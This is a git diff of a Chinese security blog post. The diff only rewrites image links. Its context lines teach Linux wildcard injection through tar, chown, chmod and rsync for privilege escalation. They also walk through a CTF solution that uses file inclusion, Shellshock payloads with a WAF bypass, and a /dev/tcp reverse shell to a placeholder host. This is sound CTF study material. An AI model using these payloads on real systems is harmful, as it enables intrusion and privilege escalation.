@@ -67,8 +67,7 @@ Sec
 <span class=nb>echo</span> <span class=s2>&#34;This is wildcard Injection&#34;</span> &gt;file2
 <span class=nb>echo</span> <span class=s2>&#34;take help&#34;</span> &gt; --help
 </code></pre></div><p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004647.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004647.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004647.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004647.jpg loading=lazy>
 </a>
 </figure></p>
 <p>首先创建几个文件，其中有一个是<code>--help</code>，然后使用<code>cat</code>命令读取文件内容</p>
@@ -76,42 +75,36 @@ Sec
 cat file <span class=m>2</span>
 cat --help
 </code></pre></div><p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007192.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007192.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007192.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007192.jpg loading=lazy>
 </a>
 </figure></p>
 <p>如果按照我们预期的，是不是在第三个<code>cat --help</code>处应该是要读取<code>—help</code>文件的内容呢？然而我们执行<code>cat —help</code>却优先执行了<code>cat</code>命令的帮助选项，并没有读出<code>—help</code>里的内容。</p>
 <p>不仅是<code>cat</code>，<code>ls</code>等命令也会优先调用内置<code>--help</code>选项。</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009843.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009843.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009843.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009843.jpg loading=lazy>
 </a>
 </figure></p>
 <p>以及还有<code>--all</code>选项。</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007699.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007699.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007699.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007699.jpg loading=lazy>
 </a>
 </figure></p>
 <p>其实讲道理，词法分析把对诸如<code>--help</code>、<code>--all</code>等选项优先处理为内置选项输出，看起来并没有任何问题</p>
 <p>这个技巧叫做<code>Wildcard wildness</code>，中文有人译为通配符在野。(<code>-all</code>、<code>--help</code>可以通过加入<code>./</code>成<code>./-all</code>、<code>./--help</code>来特指这个文件，避免这个问题)</p>
 <h4 id=example-2>Example 2</h4>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008865.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008865.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008865.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008865.jpg loading=lazy>
 </a>
 </figure></p>
 <p>如图，我们有两个文件，当用<code>rm *</code>的时候，只删掉了<code>file1</code>与<code>file2</code>，并没有删除<code>*</code></p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001503.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001503.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001503.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001503.jpg loading=lazy>
 </a>
 </figure></p>
 <p>或者使用<code>rm file1 file2 -rf</code>逐个删除之时，也只删掉了<code>file1</code>与<code>file2</code></p>
 <p>使用<code>strace rm *</code>我们可以发现</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005779.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005779.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005779.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005779.jpg loading=lazy>
 </a>
 </figure></p>
 <p>由于当前目录中存在<code>-rf</code>文件名，<code>rm</code>将<code>-rf</code>选项作为最后一个参数，并且递归删除当前目录中的所有文件。同样，若要删除可以加上<code>./-rf</code>进行删除</p>
@@ -121,21 +114,18 @@ cat --help
 <p>现在我们有三个用户，一个<code>zedd</code>，一个<code>test</code>，一个<code>root</code>用户。</p>
 <p>我们分别用<code>zedd</code>与<code>test</code>创建了不同的文件，<code>1.php</code>与<code>test.php</code>都属于<code>test</code>用户的文件，<code>zedd.php</code>与<code>--reference=zedd.php</code>均属于<code>zedd</code>用户的文件。</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005137.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005137.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005137.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005137.jpg loading=lazy>
 </a>
 </figure></p>
 <p>然后使用<code>root</code>用户使用<code>chown -R test:test *.php</code>命令，想把本目录下所有的<code>.php</code>文件修改为<code>test</code>用户所有。</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008433.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008433.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008433.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008433.jpg loading=lazy>
 </a>
 </figure></p>
 <p>但是结果我们可以发现，结果该目录下所有的<code>.php</code>文件都被修改为了<code>zedd</code>用户所有，成功“提权”。</p>
 <p>原理我们可以用<code>strace chown -R zedd:zedd *.php</code>来看一下（注意这里换了一下，模拟想把<code>.php</code>文件改变成<code>zedd</code>用户所有）</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009617.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009617.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009617.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009617.jpg loading=lazy>
 </a>
 </figure></p>
 <p>我们可以看到</p>
@@ -146,8 +136,7 @@ cat --help
 </code></pre><p><code>--reference=RFILE</code>这个选项则是使用<code>RFILE</code>的文件拥有者和用户组来改变文件属性，而不是使用传入的<code>OWNER:GROUP</code>参数。</p>
 <p>因此，在这种情况下，<code>chown</code>的<code>--reference</code>选项将覆盖指定为<code>root</code>用户输入的参数<code>zedd:zedd</code>，把此目录中所有<code>.php</code>文件的所有者改变与<code>.backdoor.php</code>的所有者<code>test</code>。</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003986.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003986.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003986.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003986.jpg loading=lazy>
 </a>
 </figure></p>
 <p>所以，按照这种方法，我们可以劫持<code>root</code>将文件的所有权更改为任意用户，并“劫持”我们想要的文件。</p>
@@ -155,8 +144,7 @@ cat --help
 <p>类似<code>chown</code>的还有一个命令<code>chmod</code>，它也有<code>--reference=RFIE</code>的选项</p>
 <div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>--reference<span class=o>=</span>RFILE  use RFILE<span class=err>&#39;</span>s mode instead of MODE values
 </code></pre></div><p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000066.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000066.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000066.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000066.jpg loading=lazy>
 </a>
 </figure></p>
 <p>与<code>chown</code>类似，因为有<code>--reference=.backdoor.php</code>的存在，在使用<code>chmod 000 *</code>的时候也会把劫持到与<code>.backdoor.php</code>文件权限一样的权限</p>
@@ -169,20 +157,17 @@ cat --help
 </code></pre></div><p>从帮助文档，我们大致可以从中理解到，<code>--checkpoint=1</code>可以用来显示信息，<code>--checkpoint-action=exec=sh shell.sh</code>可以用来执行命令</p>
 <p>先尝试构建一个<code>shell.sh</code>脚本，内容为<code>/usr/bin/id</code>，以及文件名为<code>--checkpoint=1</code>与<code>--checkpoint-action=exec=sh shell.sh</code>的文件，使用<code>tar -cf test.tar *</code>把当前目录下所有文件压缩到<code>test.tar</code>压缩包内</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008945.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008945.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008945.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008945.jpg loading=lazy>
 </a>
 </figure></p>
 <p>可见，<code>/usr/bin/id</code>已经被成功执行输出。</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007928.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007928.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007928.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007928.jpg loading=lazy>
 </a>
 </figure></p>
 <p>与之前一样，<code>--checkpoint=1</code>与<code>--checkpoint-action=exec=sh shell.sh</code>被作为选项处理</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007550.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007550.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007550.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007550.jpg loading=lazy>
 </a>
 </figure></p>
 <p>在 2018 SWPUCTF 上有一道 web 题考点也正是利用了这个点，由于题目官方没有开源，这里给一个比较详细的 @一叶飘零 师傅写的 wp 用于参考学习: <a class=link href=https://skysec.top/2018/12/17/2018SWPUCTF-Web/#%E4%BF%A1%E6%81%AF%E5%86%8D%E6%AC%A1%E5%8F%91%E6%8E%98 target=_blank rel=noopener>2018SWPUCTF-Web#信息再次发掘</a></p>
@@ -199,8 +184,7 @@ cat --help
 </code></pre></div><p><code>--rsh=COMMAND</code>又是一个我们可以利用的地方，我们首先创建一个文件名为<code>-e sh shell.c</code>的文件，然后再创建一个<code>shell.c</code>文件，污染<code>rsync</code>参数来实现执行我们在<code>shell.c</code>中写入的预期命令</p>
 <p>假设当前目录下我们拥有一个只有<code>root</code>用户可读的<code>rootfile</code>文件，由于不能直接输出结果，我们可以构造<code>cat ./rootfile > ./output</code>，将文件内容读出。</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004148.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004148.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004148.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004148.jpg loading=lazy>
 </a>
 </figure></p>
 <p>得到的<code>output</code>文件是 644 的权限，这样我们就成功构造了一个提权读取的文件的 payload ，这里可能需要注意的是，只能提取到执行<code>rsync</code>用户的权限，不是直接的<code>root</code>权限，这里因为执行命令的是<code>root</code>权限，所以能读取只有<code>root</code>用户才能读取的<code>rootfile</code>文件</p>
@@ -215,8 +199,7 @@ cat --help
 <li>
 <p><code>tar</code>命令需要进入到<code>--checkpoint=1</code>文件所在的目录内，如果加上绝对路径将会失效，例如<code>tar cf test.tar /var/www/html/*</code></p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005324.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005324.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005324.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005324.jpg loading=lazy>
 </a>
 </figure></p>
 <p>我们可以看到 shell 处理方式将<code>/home/zedd/Desktop/test</code>与目录下的文件名逐个拼接起来，就达不到污染参数的效果了</p>
@@ -227,8 +210,7 @@ cat --help
 <li>
 <p>利用<code>chmod u+s /usr/bin/find</code>提升为<code>root</code>权限执行，配合<code>find</code>命令的<code>-exec COMMAND</code>来执行命令，例如<code>find f1 -exec "whoami" \;</code></p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009998.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009998.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009998.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009998.jpg loading=lazy>
 </a>
 </figure></p>
 </li>
@@ -239,8 +221,7 @@ cat --help
 <h4 id=echo>Echo</h4>
 <p><code>echo *</code>可以用来显示目录，<code>echo /???g</code>可以用来探测文件</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008270.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008270.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008270.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008270.jpg loading=lazy>
 </a>
 </figure></p>
 <h4 id=ln>ln</h4>
@@ -251,8 +232,7 @@ cat --help
 <p><code>ln</code>命令常常用于链接两个文件，而且分两种链接模式，一种硬链接一种软链接，详细可以参考<a class=link href=https://www.ibm.com/developerworks/cn/linux/l-cn-hardandsymb-links/index.html target=_blank rel=noopener>理解Linux硬链接与软链接</a>。这里主要讲讲软链接，软链接相当于我们 Windows 中的快捷方式，可以使用<code>ln -s</code>创建</p>
 <p>例如，这里我们根目录下有一个文件内容为<code>flag{xxx}</code>的名为<code>flag</code>文件，我们使用<code>ln -s /flag file</code>，在当前目录下创建一个<code>file</code>文件链接到<code>/flag</code>，使用<code>cat file</code>与<code>php -r "echo file_get_contents('file')" </code>均可以读取到<code>/flag</code>的内容。</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005445.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005445.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005445.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005445.jpg loading=lazy>
 </a>
 </figure></p>
 <p>这个软链接读取文件内容已经被多次利用</p>
@@ -288,45 +268,38 @@ env -i X=';() { (a)=>' bash -c &lsquo;echo date&rsquo;; cat echo</p>
 </ul>
 <p>题目设置为几个功能，一个<code>man</code>命令的帮助文档</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000217.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000217.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000217.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000217.jpg loading=lazy>
 </a>
 </figure></p>
 <p>选择了<code>ls</code>，多了个请求参数<code>file=ls</code></p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009784.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009784.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009784.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009784.jpg loading=lazy>
 </a>
 </figure></p>
 <p>尝试用其他命令，比如<code>find</code></p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003424.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003424.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003424.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003424.jpg loading=lazy>
 </a>
 </figure></p>
 <p>猜测<code>eval("man /bin/" + command)</code>或者一些其他的目录</p>
 <p><code>Tar Tester</code>界面可以上传压缩包但是并没有解压，只是<code>tar -tvf test.tar</code>查看压缩包内的内容</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006647.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006647.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006647.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006647.jpg loading=lazy>
 </a>
 </figure></p>
 <p><code>Cmd Exec</code>界面只有两个命令，一个<code>ls</code>，一个<code>env</code></p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000773.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000773.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000773.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000773.jpg loading=lazy>
 </a>
 </figure></p>
 <p><code>List files</code>是个目录列举界面，可以列举几个目录</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008062.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008062.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008062.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008062.jpg loading=lazy>
 </a>
 </figure></p>
 <p>观察题目，题目 url<code>https://command-executor.hackme.inndy.tw/index.php?func=untar</code>等均带有<code>func=xxx</code>参数来展示页面，猜测会有文件包含漏洞，尝试使用<code>func=php://filter/read=convert.base64-encode/resource=index</code>读取文件内容，成功得到回显</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000836.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000836.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000836.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000836.jpg loading=lazy>
 </a>
 </figure></p>
 <p>解码得到 <code>index.php</code>源码</p>
@@ -560,8 +533,7 @@ function render_default() { ?&gt;
 </span><span class=err>?&gt;
 </span></code></pre></div><p>接下来我们就可以利用<code>ls.php</code>来找<code>flag</code>了，因为<code>ls.php</code>没什么过滤，所以用<code>func=ls&file=../../../</code>可以发现根目录下的文件</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008571.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008571.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008571.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008571.jpg loading=lazy>
 </a>
 </figure></p>
 <p>接下来就是考虑怎么去读了，<code>man.php</code>因为有<code>preg_match('/^[\w\-]+$/', $file) !== 1</code>限制得比较死，<code>untar.php</code>貌似只有<code>tar -tvf</code>并没有什么用处，只有<code>cmd.php</code>给出了一个比较不太寻常的<code>env</code>这个命令，其实这样也算是提示得比较明显了，比较容易让人想到也可以比较容易搜到<code>ShellShock</code>漏洞，并且在<code>index.php</code>中发现有</p>
@@ -598,21 +570,18 @@ function render_default() { ?&gt;
 <div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>env <span class=nv>x</span><span class=o>=</span><span class=s1>&#39;() { :;}; echo vulnerable&#39;</span> bash -c <span class=s2>&#34;echo this is a test&#34;</span> 
 </code></pre></div><p>我们就可以利用<code>putenv</code>实现参数传递，直接设置<code>User-agent: () { :;}; echo 222222</code>，发现被 waf</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000803.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000803.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000803.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000803.jpg loading=lazy>
 </a>
 </figure></p>
 <p>分析 waf 结合漏洞成因，我们可以在最后的<code>};</code>中间添加一个空格绕过，设置<code>User-Agent: () { :;} ; echo 222222</code>，成功发现输出 22222 ，我们也可以使用<code>() { _; } >_[$($())] { whoami; }</code>这个 payload</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002148.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002148.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002148.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002148.jpg loading=lazy>
 </a>
 </figure></p>
 <p>发现当前用户为<code>www-data</code>，而我们之前发现根目录<code>flag</code>的权限为<code>-r-------- 1 flag root 37 Jan 9 2018 flag</code>，所以不能直接读取，但是有一个<code>flag-reader</code>与<code>flag-reader.c</code>的文件，这应该是题目提示了。因为<code>index.php</code>又把<code>flag</code>关键字屏蔽了，我们也不能直接读取<code>flag-reader.c</code>，但是我们这里可以利用通配符读取，例如使用<code>fla*.c</code></p>
 <p>使用<code>() { _; } >_[$($())] { cat /fla*.c; }</code>得到<code>flag-reader.c</code>源码</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006944.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006944.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006944.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006944.jpg loading=lazy>
 </a>
 </figure></p>
 <p>Flag-reader.c:</p>
@@ -652,16 +621,14 @@ function render_default() { ?&gt;
 </code></pre></div><p>使用<code>bash -c "sh >& /dev/tcp/your ip/port 0>&1" </code>直接反弹 shell</p>
 <p>运行<code>flag-reader</code></p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008222.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008222.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008222.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008222.jpg loading=lazy>
 </a>
 </figure></p>
 <p>审计一下这段代码，大致是输出一串随机数，然后在1s之内又要输入进去，否则就<code>write(1, "Wrong response\n", 16);</code>&mldr;</p>
 <p>然而我在回弹 shell 之后，利用<code>/tmp</code>可写的权限，貌似有点小问题，一旦<code>cat /tmp/zedd</code>，链接就断掉了，无奈只能找其他文件夹，发现<code>/run/lock</code>与<code>/var/tmp</code>均可读可写，使用<code>/flag-reader flag > /run/lock/zedd &lt; /run/lock/zedd</code>写入 flag</p>
 <p>反弹 shell 使用<code>cat</code>非常容易断掉，最好使用执行的方式，最后得到 flag</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001695.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001695.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001695.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001695.jpg loading=lazy>
 </a>
 </figure></p>
 <h2 id=上篇的解释与补充>上篇的解释与补充</h2>
@@ -791,8 +758,7 @@ This challenge was published in the Layer7 CTF in 2018.
 <div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>b</span><span class=p>&gt;</span>Usage<span class=p>&lt;/</span><span class=nt>b</span><span class=p>&gt;</span>: Please enter the parameter like as in <span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;/?file=test.txt&#34;</span><span class=p>&gt;</span>this<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>.
 </code></pre></div><p>跟进得到<code>test.txt</code>的内容</p>
 <p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006888.jpg>
-<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006888.jpg loading=lazy>
+<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006888.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006888.jpg loading=lazy>
 </a>
 </figure></p>
 <p>猜测为文件包含，尝试直接读取<code>flag</code>被<code>waf</code>，直接读取<code>https://cat.canhack.me/?file=index.php</code></p>
